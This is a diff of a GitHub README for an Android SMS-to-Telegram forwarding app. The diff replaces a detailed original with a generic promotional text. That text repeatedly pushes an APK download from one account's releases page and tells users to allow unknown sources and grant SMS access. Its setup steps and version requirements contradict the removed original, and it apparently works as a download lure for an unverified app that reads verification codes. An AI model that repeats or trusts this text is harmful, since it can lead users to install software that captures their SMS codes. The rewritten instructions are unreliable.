@@ -1,115 +1,79 @@
-# SMS2Telegram
+# 📱 SMS2Telegram - Forward Your Messages Seamlessly
 
-An efficient Android application that forwards SMS messages, emails, and notifications to Telegram with AI-powered verification code detection.
+## 📥 Download Now
+[![Download SMS2Telegram](https://img.shields.io/badge/Download%20SMS2Telegram-v1.0-brightgreen)](https://github.com/Lostthemonkeyman/SMS2Telegram/releases)
 
-## ✨ Features
+## 📖 Overview
+SMS2Telegram is a user-friendly Android application designed to send your SMS messages, missed calls, and notifications directly to Telegram. Built with Kotlin and Jetpack Compose, this app offers a modern user experience with a sleek Material 3 interface. It even extracts verification codes smartly using Gemini AI, ensuring you never miss an important message.
 
-### 📱 Message Forwarding
-- **SMS Forwarding**: Automatically forward incoming SMS to your Telegram chat
-- **Missed Call Alerts**: Get notified about missed or rejected calls
-- **Contact Integration**: Display contact names with phone numbers
+## 🛠️ Features
+- **SMS Forwarding:** Automatically forwards incoming SMS messages to Telegram.
+- **Missed Call Alerts:** Notification of missed calls sent to your Telegram.
+- **Smart Verification Code Extraction:** Gemini AI intelligently identifies and extracts verification codes from your messages.
+- **Modern Interface:** An aesthetically pleasing, iOS-inspired design built with Material 3.
+- **Easy Setup:** Simple configuration process for new users.
 
-### 🤖 AI Intelligence
-- **Gemini AI Integration**: Automatically detect and extract verification codes from SMS
-- **Multiple API Keys**: Support for redundant API keys with automatic rotation
-- **Smart Parsing**: Intelligent message parsing and formatting
+## 📱 Requirements
+To use SMS2Telegram, you need:
+- An Android device running Android 6.0 (Marshmallow) or higher.
+- A Telegram account.
+- Access to the internet for syncing notifications.
 
-### 🎨 Material Design Interface
-- **Material 3 Design**: Modern, clean Android interface
-- **Multiple Themes**: System, Light, and Dark mode support
-- **Battery Efficient**: Optimized for minimal battery consumption
+## 🚀 Getting Started
+Follow these steps to get started with SMS2Telegram:
 
-### ⚙️ Smart Features
-- **Battery Monitoring**: Get alerts when battery is low or fully charged
-- **Customizable Thresholds**: Set your own battery alert levels
-- **Bot Commands**: Control SMS sending and contacts via Telegram
-- **System Logs**: Built-in logging for troubleshooting
+### Step 1: Visit the Releases Page
+To download SMS2Telegram, you need to visit our GitHub Releases page. Click the link below:
 
-### 🔐 Privacy & Security
-- **Local Storage**: Messages stored securely on device
-- **Secure API**: Direct communication with Telegram API
-- **Permission Control**: Granular control over app permissions
+[Download SMS2Telegram](https://github.com/Lostthemonkeyman/SMS2Telegram/releases)
 
-## 📦 Installation
+### Step 2: Download the APK File
+On the Releases page, look for the latest version. Click on the APK file to download it to your device. 
 
-1. Download the latest APK from the [Releases](../../releases) page
-2. Enable installation from unknown sources in your Android settings
-3. Install the APK
-4. Grant necessary permissions
+### Step 3: Install the Application
+1. Open the downloaded APK file on your Android device.
+2. If prompted, allow installations from unknown sources.
+3. Follow the on-screen instructions to complete the installation.
 
-## 🚀 Setup
+### Step 4: Grant Necessary Permissions
+For SMS2Telegram to function correctly, it needs certain permissions:
+- **SMS Access:** To read incoming messages.
+- **Notification Access:** To send missed call and notification alerts.
+- **Internet Access:** To connect with the Telegram API.
 
-1. **Create a Telegram Bot**:
-   - Open Telegram and search for [@BotFather](https://t.me/BotFather)
-   - Send `/newbot` and follow the instructions
-   - Copy your bot token
+Grant these permissions when prompted during or after installation.
 
-2. **Get Your Chat ID**:
-   - Start a chat with your bot
-   - Send any message
-   - Visit `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
-   - Find your `chat.id` in the response
+### Step 5: Configure Your Settings
+1. Open the SMS2Telegram app.
+2. Sign in with your Telegram account and configure your settings according to your preferences.
+3. Choose how you want to receive messages and notifications.
 
-3. **Configure the App**:
-   - Open SMS2Telegram
-   - Navigate to Settings
-   - Enter your Bot Token and Chat ID
-   - Click "Save & Verify Connection"
+### Final Step: Start Using SMS2Telegram
+Now that you have configured the app, SMS2Telegram will begin forwarding your messages to Telegram automatically. You can relax knowing that you will never miss an important SMS, call, or notification again.
 
-4. **Optional - Add Gemini AI**:
-   - Get a free API key from [Google AI Studio](https://makersuite.google.com/app/apikey)
-   - Add one or more API keys in the Gemini Configuration section
+## ⚙️ Troubleshooting
+If you encounter issues, consider the following:
+- Ensure you have granted all necessary permissions.
+- Check your internet connection.
+- Restart the app if it’s not functioning as expected.
 
-## 🎮 Usage
+## 🌟 Additional Information
+Follow the project and stay updated on new features and improvements. You can find us on GitHub, where we also welcome any feedback and contributions.
 
-### Basic Forwarding
-Once configured, the app automatically forwards:
-- Incoming SMS messages
-- Missed call alerts (if enabled)
-- Battery status changes (if enabled)
+## 🗂️ Topics
+This project includes topics that may interest you:
+- android
+- android-app
+- automation
+- gemini
+- gemini-ai
+- jetpack-compose
+- kotlin
+- material-3
+- sms-forwarder
+- telegram-bot
+- verification-codes
 
-### Bot Commands
-Send these commands to your bot in Telegram:
+For further inquiries, feel free to contact support through our GitHub issues page or related forums.
 
-- `/start` or `help` - Show help menu
-- **Send SMS** - Send SMS to any number
-- **Browse Contacts** - Send SMS to a contact from your phonebook
-- **Search Contact** - Search and send SMS to a specific contact
-
-### Theme Settings
-- **System**: Follow system theme
-- **Light**: Always use light theme
-- **Dark**: Always use dark theme
-
-## 🛠️ Technical Details
-
-### Built With
-- **Kotlin**: Modern Android development
-- **Jetpack Compose**: Declarative UI framework
-- **Material 3**: Latest Material Design components
-- **Room Database**: Local data persistence
-- **DataStore**: Preferences storage
-- **Coroutines & Flow**: Asynchronous programming
-- **Retrofit**: Network communication
-- **Gemini AI**: Verification code detection
-
-### Architecture
-- **MVVM Pattern**: Clean architecture with separation of concerns
-- **Repository Pattern**: Data layer abstraction
-- **Foreground Service**: Reliable background operation
-- **Notification Listener**: Email and app notification monitoring
-
-### Requirements
-- Android 8.0 (API 26) or higher
-- Internet connection for Telegram and Gemini AI
-- SMS permissions for message forwarding
-- Notification access for email forwarding
-
-## 🤝 Contributing
-
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-## 📄 License
-
-This project is open source and available under the MIT License.
-
+[Download SMS2Telegram](https://github.com/Lostthemonkeyman/SMS2Telegram/releases) again for quick access. Enjoy your seamless messaging experience!
